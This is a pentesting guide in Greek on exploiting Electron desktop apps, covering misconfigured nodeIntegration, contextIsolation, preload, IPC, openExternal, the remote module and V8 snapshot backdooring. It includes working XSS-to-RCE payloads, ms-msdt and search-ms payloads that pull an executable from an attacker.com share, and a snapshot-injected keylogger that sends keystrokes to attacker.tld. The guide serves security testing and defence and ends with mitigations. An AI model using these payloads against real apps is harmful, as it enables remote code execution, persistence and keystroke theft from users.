# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## Εισαγωγή

Το Electron συνδυάζει ένα τοπικό backend (με **NodeJS**) και ένα frontend (**Chromium**), αν και του λείπουν κάποιοι μηχανισμοί ασφαλείας των σύγχρονων περιηγητών.

Συνήθως μπορεί να βρείτε τον κώδικα της εφαρμογής electron μέσα σε ένα αρχείο `.asar`. Για να αποκτήσετε τον κώδικα, πρέπει να το εξάγετε:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Στον πηγαίο κώδικα μιας εφαρμογής Electron, μέσα στο `packet.json`, μπορείτε να βρείτε δηλωμένο το αρχείο `main.js` όπου έχουν οριστεί οι ρυθμίσεις ασφάλειας.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Το Electron έχει 2 τύπους διεργασιών:

- Main Process (έχει πλήρη πρόσβαση στο NodeJS)
- Renderer Process (θα πρέπει να έχει περιορισμένη πρόσβαση στο NodeJS για λόγους ασφάλειας)

![](<../../../images/image (182).png>)

Μια **renderer process** θα είναι ένα παράθυρο browser που φορτώνει ένα αρχείο:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Οι ρυθμίσεις της **διαδικασίας renderer** μπορούν να **διαμορφωθούν** στη **διαδικασία main** μέσα στο αρχείο main.js. Μερικές από τις ρυθμίσεις θα **εμποδίσουν την εφαρμογή Electron να αποκτήσει RCE** ή άλλες ευπάθειες εάν οι **ρυθμίσεις είναι σωστά διαμορφωμένες**.

Η εφαρμογή Electron **θα μπορούσε να έχει πρόσβαση στη συσκευή** μέσω Node apis αν και μπορεί να διαμορφωθεί ώστε να το αποτρέψει:

- **`nodeIntegration`** - είναι `off` από προεπιλογή. Αν είναι on, επιτρέπει την πρόσβαση σε λειτουργίες του Node από τη διαδικασία renderer.
- **`contextIsolation`** - είναι `on` από προεπιλογή. Αν είναι off, οι διεργασίες main και renderer δεν είναι απομονωμένες.
- **`preload`** - κενό από προεπιλογή.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - είναι off από προεπιλογή. Θα περιορίσει τις ενέργειες που μπορεί να εκτελέσει το NodeJS.
- Node Integration σε Workers
- **`nodeIntegrationInSubframes`**- είναι `off` από προεπιλογή.
- Εάν **`nodeIntegration`** είναι **enabled**, αυτό θα επέτρεπε τη χρήση των **Node.js APIs** σε σελίδες web που είναι **φορτωμένες σε iframes** μέσα σε μια εφαρμογή Electron.
- Εάν **`nodeIntegration`** είναι **disabled**, τότε τα preloads θα φορτωθούν στο iframe

Παράδειγμα διαμόρφωσης:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Μερικά **RCE payloads** από [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Καταγραφή κυκλοφορίας

Τροποποιήστε τη διαμόρφωση start-main και προσθέστε τη χρήση ενός proxy όπως:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Εάν μπορείτε να εκτελέσετε τοπικά ένα Electron App, είναι πιθανό να το αναγκάσετε να εκτελέσει αυθαίρετο javascript κώδικα. Δείτε πώς στο:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Εάν το **nodeIntegration** είναι ρυθμισμένο σε **on**, το JavaScript μιας ιστοσελίδας μπορεί εύκολα να χρησιμοποιήσει δυνατότητες του Node.js απλώς καλώντας το `require()`. Για παράδειγμα, ο τρόπος για να εκτελέσετε την εφαρμογή calc στα Windows είναι:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Το script που υποδεικνύεται σε αυτή τη ρύθμιση είναι **φορτωμένο πριν από άλλα scripts στον renderer**, οπότε έχει **απεριόριστη πρόσβαση στα Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Συνεπώς, το script μπορεί να εξάγει τα node-features σε pages:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Αν το `contextIsolation` είναι ενεργοποιημένο, αυτό δεν θα λειτουργήσει**

## RCE: XSS + contextIsolation

Το _**contextIsolation**_ εισάγει τους **διαχωρισμένους χώρους εκτέλεσης μεταξύ των scripts της σελίδας και του εσωτερικού JavaScript κώδικα του Electron**, ώστε η εκτέλεση JavaScript του κάθε κομματιού κώδικα να μην επηρεάζει το άλλο. Αυτό είναι ένα απαραίτητο χαρακτηριστικό για να εξαλειφθεί η πιθανότητα RCE.

Αν οι χώροι δεν είναι απομονωμένοι, ένας επιτιθέμενος μπορεί:

1. Να εκτελέσει **arbitrary JavaScript in renderer** (XSS ή πλοήγηση σε εξωτερικούς ιστότοπους)
2. Να **overwrite the built-in method** που χρησιμοποιείται στο preload ή στον εσωτερικό κώδικα του Electron για να πάρει τον έλεγχο μιας λειτουργίας
3. Να **trigger** τη χρήση της **overwritten function**
4. RCE?

Υπάρχουν 2 σημεία όπου built-in μέθοδοι μπορούν να υπεργραφούν: στο preload code ή στον εσωτερικό κώδικα του Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass click event

Αν εφαρμόζονται περιορισμοί όταν κάνεις κλικ σε ένα σύνδεσμο, ίσως μπορέσεις να τους παρακάμψεις **κάνoντας a middle click** αντί για το συνηθισμένο left click
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Για περισσότερες πληροφορίες σχετικά με αυτά τα παραδείγματα, δείτε [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) και [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Κατά την ανάπτυξη μιας Electron desktop εφαρμογής, η σωστή ρύθμιση των `nodeIntegration` και `contextIsolation` είναι κρίσιμη. Έχει διαπιστωθεί ότι η **client-side remote code execution (RCE)** που στοχεύει preload scripts ή το native code του Electron από τη main process αποτρέπεται ουσιαστικά με αυτές τις ρυθμίσεις.

Όταν ένας χρήστης αλληλεπιδρά με συνδέσμους ή ανοίγει νέα παράθυρα, ενεργοποιούνται συγκεκριμένοι event listeners, οι οποίοι είναι κρίσιμοι για την ασφάλεια και τη λειτουργικότητα της εφαρμογής:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Αυτοί οι listeners **υπερκαθορίζονται από την επιτραπέζια εφαρμογή** για να υλοποιήσει τη δική της **επιχειρηματική λογική**. Η εφαρμογή αξιολογεί εάν ένας πλοηγημένος σύνδεσμος πρέπει να ανοιχτεί εσωτερικά ή σε εξωτερικό πρόγραμμα περιήγησης. Αυτή η απόφαση συνήθως λαμβάνεται μέσω μιας συνάρτησης, `openInternally`. Εάν αυτή η συνάρτηση επιστρέψει `false`, σημαίνει ότι ο σύνδεσμος πρέπει να ανοιχτεί εξωτερικά, χρησιμοποιώντας τη συνάρτηση `shell.openExternal`.

**Εδώ είναι ένα απλοποιημένο pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Οι βέλτιστες πρακτικές ασφάλειας του Electron JS συμβουλεύουν να μην γίνεται αποδοχή μη αξιόπιστου περιεχομένου μέσω της `openExternal` συνάρτησης, καθώς αυτό μπορεί να οδηγήσει σε RCE μέσω διάφορων πρωτοκόλλων. Τα λειτουργικά συστήματα υποστηρίζουν διαφορετικά πρωτόκολλα που μπορεί να προκαλέσουν RCE. Για λεπτομερή παραδείγματα και περαιτέρω επεξήγηση πάνω στο θέμα, μπορείτε να αναφερθείτε σε [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), το οποίο περιλαμβάνει Windows πρωτόκολλα παραδειγμάτων ικανά να εκμεταλλευτούν αυτή την ευπάθεια.

Σε macos, η `openExternal` συνάρτηση μπορεί να εκμεταλλευτεί για να εκτελέσει αυθαίρετες εντολές, όπως στο `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Παραδείγματα εκμεταλλεύσεων Windows πρωτοκόλλων περιλαμβάνουν:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Αυτό το vuln μπορεί να βρεθεί στο **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Το **webviewTag** είναι ένα **απαρχαιωμένο χαρακτηριστικό** που επιτρέπει τη χρήση του **NodeJS** στη **renderer process**, το οποίο πρέπει να απενεργοποιηθεί καθώς επιτρέπει τη φόρτωση ενός script μέσα στο preload context όπως:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Επομένως, ένας επιτιθέμενος που καταφέρνει να φορτώσει μια αυθαίρετη σελίδα θα μπορούσε να χρησιμοποιήσει αυτό το tag για να **load an arbitrary preload script**.

Αυτό το preload script στη συνέχεια εκμεταλλεύτηκε για να καλέσει μια **vulnerable IPC service (`skype-new-window`)** η οποία καλούσε **`shell.openExternal`** για να αποκτήσει RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Ανάγνωση Εσωτερικών Αρχείων: XSS + contextIsolation

**Η απενεργοποίηση του `contextIsolation` επιτρέπει τη χρήση των tags `<webview>`**, παρόμοια με `<iframe>`, για την ανάγνωση και exfiltrating τοπικών αρχείων. Ένα παράδειγμα δείχνει πώς να εκμεταλλευτείς αυτήν την ευπάθεια για να διαβάσεις τα περιεχόμενα εσωτερικών αρχείων:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Επιπλέον, παρουσιάζεται άλλη μέθοδος για **ανάγνωση εσωτερικού αρχείου**, αναδεικνύοντας μια κρίσιμη ευπάθεια ανάγνωσης τοπικού αρχείου σε μια Electron desktop app. Αυτό περιλαμβάνει την έγχυση ενός script για να εκμεταλλευτεί την εφαρμογή και exfiltrate δεδομένα:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + παλιό chromium**

Εάν το **chromium** που χρησιμοποιείται από την εφαρμογή είναι **παλιό** και υπάρχουν **γνωστές** **ευπάθειες**, μπορεί να είναι δυνατό να το **εκμεταλλευτείτε και να αποκτήσετε RCE μέσω XSS**.\
Μπορείτε να δείτε ένα παράδειγμα σε αυτό το **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing μέσω bypass του εσωτερικού URL regex**

Υποθέτοντας ότι βρήκατε ένα XSS αλλά **δεν μπορείτε να ενεργοποιήσετε RCE ή να κλέψετε εσωτερικά αρχεία**, μπορείτε να προσπαθήσετε να το χρησιμοποιήσετε για να **αποσπάσετε διαπιστευτήρια μέσω phishing**.

Καταρχάς πρέπει να γνωρίζετε τι συμβαίνει όταν προσπαθείτε να ανοίξετε ένα νέο URL, ελέγχοντας τον JS κώδικα στο front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Η κλήση στο **`openInternally`** θα αποφασίσει αν το **link** θα **ανοίξει** στο **παράθυρο επιφάνειας εργασίας** καθώς είναι ένα link που ανήκει στην πλατφόρμα, **ή** αν θα ανοίξει στο **πρόγραμμα περιήγησης ως πόρος τρίτου μέρους**.

Σε περίπτωση που το **regex** που χρησιμοποιείται από τη συνάρτηση είναι **ευάλωτο σε παρακάμψεις** (για παράδειγμα **μη διαφυγής των τελειών των υποτομέων**) ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί το XSS για να **ανοίξει ένα νέο παράθυρο το οποίο** θα βρισκόταν στην υποδομή του επιτιθέμενου **ζητώντας διαπιστευτήρια** από τον χρήστη:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Πρωτόκολλο

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) σελίδες που τρέχουν σε **`file://`** έχουν μονομερή πρόσβαση σε κάθε αρχείο στο μηχάνημά σας, πράγμα που σημαίνει ότι **XSS issues can be used to load arbitrary files from the users machine**. Η χρήση **προσαρμοσμένου πρωτοκόλλου** αποτρέπει προβλήματα όπως αυτό, καθώς μπορείτε να περιορίσετε το πρωτόκολλο ώστε να εξυπηρετεί μόνο ένα συγκεκριμένο σύνολο αρχείων.

## Remote module

The Electron Remote module επιτρέπει τις **renderer processes to access main process APIs**, διευκολύνοντας την επικοινωνία εντός μιας εφαρμογής Electron. Ωστόσο, η ενεργοποίηση αυτού του module εισάγει σημαντικούς κινδύνους ασφάλειας. Αυξάνει την επιφάνεια επίθεσης της εφαρμογής, καθιστώντας την πιο επιρρεπή σε ευπάθειες όπως επιθέσεις cross-site scripting (XSS).

> [!TIP]
> Παρότι το **remote** module εκθέτει κάποια APIs από το main προς τις renderer processes, δεν είναι απλό να επιτευχθεί RCE μόνο με την κατάχρηση των components. Ωστόσο, τα components μπορεί να αποκαλύπτουν ευαίσθητες πληροφορίες.

> [!WARNING]
> Πολλές εφαρμογές που εξακολουθούν να χρησιμοποιούν το remote module το κάνουν με τρόπο που απαιτούν το **NodeIntegration να είναι ενεργοποιημένο** στη renderer process, κάτι που αποτελεί **τεράστιο κίνδυνο ασφάλειας**.

Από το Electron 14 και μετά, το `remote` module μπορεί να είναι ενεργοποιημένο με διάφορους τρόπους, αλλά για λόγους ασφάλειας και απόδοσης **συνιστάται να μην το χρησιμοποιείτε**.

Για να το ενεργοποιήσετε, πρέπει πρώτα να **ενεργοποιηθεί στο main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Στη συνέχεια, η διεργασία renderer μπορεί να εισάγει αντικείμενα από το module που θέλει:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Το **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** αναφέρει κάποιες ενδιαφέρουσες **συναρτήσεις** που εκτίθενται από το αντικείμενο **`app`** του remote module:

- **`app.relaunch([options])`**
- **Επανακινεί** την εφαρμογή τερματίζοντας την τρέχουσα παρουσία και εκκινώντας μία καινούρια. Χρήσιμο για **ενημερώσεις εφαρμογής** ή σημαντικές **αλλαγές κατάστασης**.
- **`app.setAppLogsPath([path])`**
- **Ορίζει** ή **δημιουργεί** έναν φάκελο για αποθήκευση των **logs της εφαρμογής**. Τα logs μπορούν να **ανακτηθούν** ή να **τροποποιηθούν** χρησιμοποιώντας **`app.getPath()`** ή **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Καταχωρεί** το τρέχον εκτελέσιμο ως τον **προεπιλεγμένο χειριστή** για ένα συγκεκριμένο **πρωτόκολλο**. Μπορείτε να παρέχετε **προσαρμοσμένο μονοπάτι** και **ορίσματα** αν χρειαστεί.
- **`app.setUserTasks(tasks)`**
- **Προσθέτει** εργασίες στην κατηγορία **Tasks** στο **Jump List** (στα Windows). Κάθε εργασία μπορεί να ελέγχει πώς **εκκινείται** η εφαρμογή ή ποια **ορίσματα** περνιούνται.
- **`app.importCertificate(options, callback)`**
- **Εισάγει** ένα **PKCS#12 certificate** στο **certificate store** του συστήματος (μόνο Linux). Ένας **callback** μπορεί να χρησιμοποιηθεί για να χειριστεί το αποτέλεσμα.
- **`app.moveToApplicationsFolder([options])`**
- **Μετακινεί** την εφαρμογή στο **Applications folder** (στο macOS). Βοηθά να εξασφαλιστεί μια **τυπική εγκατάσταση** για χρήστες Mac.
- **`app.setJumpList(categories)`**
- **Ορίζει** ή **αφαιρεί** ένα **προσαρμοσμένο Jump List** στα **Windows**. Μπορείτε να καθορίσετε **κατηγορίες** για να οργανώσετε πώς οι εργασίες εμφανίζονται στον χρήστη.
- **`app.setLoginItemSettings(settings)`**
- **Διαμορφώνει** ποια **εκτελέσιμα** εκκινούν κατά το **login** μαζί με τις **επιλογές** τους (μόνο macOS και Windows).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences μονάδα

Το **κύριο API** για πρόσβαση στις προτιμήσεις συστήματος και **εκπομπή συμβάντων συστήματος** στο Electron. Μέθοδοι όπως **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, και **setUserDefault** είναι όλες **μέρος** αυτής της μονάδας.

**Παράδειγμα χρήσης:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Ακούει** για **εγγενείς ειδοποιήσεις macOS** χρησιμοποιώντας NSDistributedNotificationCenter.
* Πριν από το **macOS Catalina**, μπορούσατε να sniff **όλες** τις διανεμημένες ειδοποιήσεις περνώντας **nil** στο CFNotificationCenterAddObserver.
* Μετά το **Catalina / Big Sur**, οι sandboxed εφαρμογές μπορούν ακόμα να **εγγραφούν** σε **πολλά συμβάντα** (π.χ. **κλείδωμα/ξεκλείδωμα οθόνης**, **mounts δίσκων**, **δραστηριότητα δικτύου**, κ.λπ.) καταχωρώντας ειδοποιήσεις **κατά όνομα**.

### **getUserDefault / setUserDefault**

* **Επικοινωνεί** με **NSUserDefaults**, που αποθηκεύει προτιμήσεις **εφαρμογής** ή **global** στο macOS.

* Η **getUserDefault** μπορεί να **ανακτήσει** ευαίσθητες πληροφορίες, όπως **πρόσφατες τοποθεσίες αρχείων** ή **γεωγραφική τοποθεσία του χρήστη**.

* Η **setUserDefault** μπορεί να **τροποποιήσει** αυτές τις προτιμήσεις, επηρεάζοντας ενδεχομένως την **διαμόρφωση** μιας εφαρμογής.

* Σε **παλαιότερες εκδόσεις του Electron** (πριν το v8.3.0), μόνο το **standard suite** των NSUserDefaults ήταν **προσβάσιμο**.

## Shell.showItemInFolder

This function shows the given file in a file manager, which **could automatically execute the file**.

Για περισσότερες πληροφορίες δείτε [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Οι εφαρμογές Electron θα πρέπει να έχουν μια **Content Security Policy (CSP)** για να **αποτρέπουν** XSS attacks. Η **CSP** είναι ένα **security standard** που βοηθά να **αποτρέπεται** η **εκτέλεση** **μη αξιόπιστου κώδικα** στον browser.

Συνήθως **διαμορφώνεται** στο αρχείο **`main.js`** ή στο πρότυπο **`index.html`**, με την CSP μέσα σε ένα **meta tag**.

Για περισσότερες πληροφορίες δείτε:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) είναι ένα εργαλείο για να εντοπίζει misconfigurations και security anti-patterns σε εφαρμογές βασισμένες σε Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) είναι ένα open source plugin για VS Code για εφαρμογές Electron που χρησιμοποιεί Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) για έλεγχο ευάλωτων third party βιβλιοθηκών
- [**Electro.ng**](https://electro.ng/): Πρέπει να το αγοράσετε

## Labs

Στο [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) θα βρείτε ένα lab για να εκμεταλλευτείτε ευάλωτες εφαρμογές Electron.

Μερικές εντολές που θα σας βοηθήσουν με το lab:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Τοπικό backdooring μέσω V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Εφαρμογές βασισμένες σε Electron και Chromium απο-σειριαλοποιούν ένα prebuilt V8 heap snapshot κατά την εκκίνηση (v8_context_snapshot.bin, και προαιρετικά browser_v8_context_snapshot.bin) για να αρχικοποιήσουν κάθε V8 isolate (main, preload, renderer). Ιστορικά, τα integrity fuses του Electron δεν αντιμετώπιζαν αυτά τα snapshots ως executable content, οπότε διέφευγαν τόσο την επιβολή ακεραιότητας με βάση fuses όσο και τους OS code-signing ελέγχους. Ως αποτέλεσμα, η αντικατάσταση του snapshot σε εγκατάσταση με δυνατότητα εγγραφής από τον χρήστη παρείχε stealthy, persistent code execution μέσα στην εφαρμογή χωρίς να τροποποιηθούν τα signed binaries ή το ASAR.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation και OnlyLoadAppFromAsar επικυρώνουν το app JavaScript μέσα στο ASAR, αλλά δεν κάλυπταν τα V8 heap snapshots (CVE-2025-55305). Το Chromium αντίστοιχα δεν κάνει integrity-check στα snapshots.
- Attack preconditions: Τοπική εγγραφή αρχείου στο directory εγκατάστασης της εφαρμογής. Αυτό είναι κοινό σε συστήματα όπου Electron apps ή Chromium browsers εγκαθίστανται σε user-writable paths (π.χ. %AppData%\Local στα Windows; /Applications με caveats στο macOS).
- Effect: Αξιόπιστη εκτέλεση attacker JavaScript σε οποιοδήποτε isolate με το clobbering ενός συχνά χρησιμοποιούμενου builtin (ένα “gadget”), επιτρέποντας persistence και αποφυγή των code-signing ελέγχων.
- Affected surface: Electron apps (ακόμα και με fuses enabled) και Chromium-based browsers που φορτώνουν snapshots από user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Παράδειγμα ελάχιστου payload (αποδείξτε την εκτέλεση προκαλώντας ένα crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (εκτέλεση διαφορετικού κώδικα στο main έναντι του renderer)
- Ανίχνευση main process: Node-only globals όπως process.pid, process.binding(), ή process.dlopen υπάρχουν στο main process isolate.
- Ανίχνευση Browser/renderer: Browser-only globals όπως alert είναι διαθέσιμα όταν εκτελούνται σε περιβάλλον εγγράφου.

Παράδειγμα gadget που διερευνά τις Node δυνατότητες της main process μία φορά
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context PoC κλοπής δεδομένων (π.χ., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) Γράψτε το payload.js που υποκαθιστά ένα κοινό builtin (π.χ., Array.isArray) και προαιρετικά διακλαδίζεται ανά isolate.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Επικαλύψτε τα snapshot αρχεία της στοχευόμενης εφαρμογής:
- v8_context_snapshot.bin (used πάντα)
- browser_v8_context_snapshot.bin (αν χρησιμοποιείται το LoadBrowserProcessSpecificV8Snapshot fuse)
4) Εκκινήστε την εφαρμογή· το gadget εκτελείται όποτε χρησιμοποιείται το επιλεγμένο builtin.

Notes and considerations
- Integrity/signature bypass: Τα snapshot files δεν αντιμετωπίζονται ως native executables από τους ελέγχους code-signing και (ιστορικά) δεν καλύπτονταν από τα fuses του Electron ή τους μηχανισμούς ακεραιότητας του Chromium.
- Persistence: Η αντικατάσταση του snapshot σε εγκατάσταση εγγράψιμη από τον χρήστη συνήθως επιβιώνει επανεκκινήσεων της εφαρμογής και μοιάζει με υπογεγραμμένη, νόμιμη εφαρμογή.
- Chromium browsers: Η ίδια ιδέα παραποίησης εφαρμόζεται σε Chrome/derivatives που είναι εγκατεστημένα σε τοποθεσίες εγγράψιμες από τον χρήστη. Το Chrome διαθέτει άλλες μετρήσεις ακεραιότητας αλλά ρητά εξαιρεί τις physically local attacks από το threat model του.

Detection and mitigations
- Θεωρήστε τα snapshots ως εκτελέσιμο περιεχόμενο και συμπεριλάβετέ τα στην επιβολή ακεραιότητας (CVE-2025-55305 fix).
- Προτιμήστε τοποθεσίες εγκατάστασης εγγράψιμες μόνο από admin; καθορίστε baseline και παρακολουθείτε hashes για v8_context_snapshot.bin και browser_v8_context_snapshot.bin.
- Εντοπίστε early-runtime υποκατάσταση builtins και απρόσμενες αλλαγές στα snapshot; ειδοποιήστε όταν τα deserialized snapshots δεν ταιριάζουν με τις αναμενόμενες τιμές.

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
